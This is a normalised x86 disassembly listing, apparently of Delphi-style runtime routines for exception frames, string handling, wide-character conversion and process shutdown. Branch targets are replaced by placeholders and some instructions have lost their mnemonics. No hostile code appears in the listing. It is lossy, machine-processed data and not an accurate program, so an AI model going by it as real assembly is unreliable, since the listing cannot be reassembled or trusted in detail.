mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_4030f8
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_403544
jmp edx
sub_403930
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027d0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403a90
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403ab8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403afe
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403b18
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403b5e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403bb8
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_4059b4
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403bdc
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_4059b4
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c04
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c28
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403c84
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403cb4
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40123c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4011f4
push eax
call sub_401214
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403d40
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403c28
call sub_403cb4
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403ab8
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403a90
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405480
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403c84
push eax
call sub_401254
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403e30
push ebp
mov ebp esp
call sub_403024
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_4026ec
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_403e68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0x8
call sub_4026cc
mov [ eax ] edi
mov edx [ ebp + 0x10 ]
mov [ eax + 0x4 ] edx
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_403e30
push eax
push esi
push ebx
call sub_401224
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_403eb4
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026ec
pop eax
sub_403ed8
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_403f08
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_403f78
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028c8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_403f4c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_403f78
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026cc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_403fa4
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_403f78
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403eb4
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028c8
sub_403fd4
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_403ff4
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_404010
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403eb4
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_404500
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_403fd4
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_403fd4
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404500
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_403fa4
jmp r-xdata
sub_4040ac
xor ecx ecx
test edx edx
je r-xdata
jmp sub_403fa4
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4040dc
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404010
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404124
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_403fa4
not ecx
sub_404150
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028c8
pop ebx
retn
mov ecx ebx
sub_40417c
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403f08
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_404500
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_404500
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028c8
pop edi
pop esi
pop ebx
retn
sub_4041c0
test edx edx
je r-xdata
mov edx ecx
jmp sub_403f08
test ecx ecx
je sub_403f08
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_40417c
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_403f78
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028c8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028c8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403f08
pop edx
pop eax
jmp sub_40417c
call sub_403f08
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_404234
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_403f78
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_404500
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028c8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403f08
dec [ edx - 0x8 ]
sub_4042c0
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404380
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_403f78
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028c8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026ec
sub_4043d4
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403eb4
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_403fa4
jmp r-xdata
pop ebx
retn 0x4
sub_404414
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404380#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028c8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_404500
mov edi ecx
sub_40445c
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_404500
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028c8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028c8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4044b8
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_404500
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403eb4
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_403f78
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_40270c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028c8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_4045ac
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_4045d0
test edx edx
je sub_404594
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404594
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
retn
sub_4045f4
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404594
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_4047dc
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_403ff4
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_403ff4
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4047dc
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404680
jmp r-xdata
sub_404680
test ecx ecx
je sub_404594
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_4046a4
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404680
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_40470c
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404790
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404700
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404680
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_4047dc
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404584
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40456c
mov ebx eax
mov eax [ edi ]
call sub_404700
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028c8
mov eax esi
sub_404820
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404850
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404850
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404850
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404820
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402828
sub_4048e4
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404930
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404930
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403ed8
jmp r-xdata
call sub_403eb4
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_4045ac
jmp r-xdata
call sub_404594
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404918
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404930
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4048e4
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_4054f0
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_404e44
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402828
sub_404a40
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028c8
mov edx [ eax + esi ]
add eax ebx
call sub_403f08
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4045d0
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404a28
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028c8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404b5c
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404a40
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_405508
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_404e80
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404b5c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
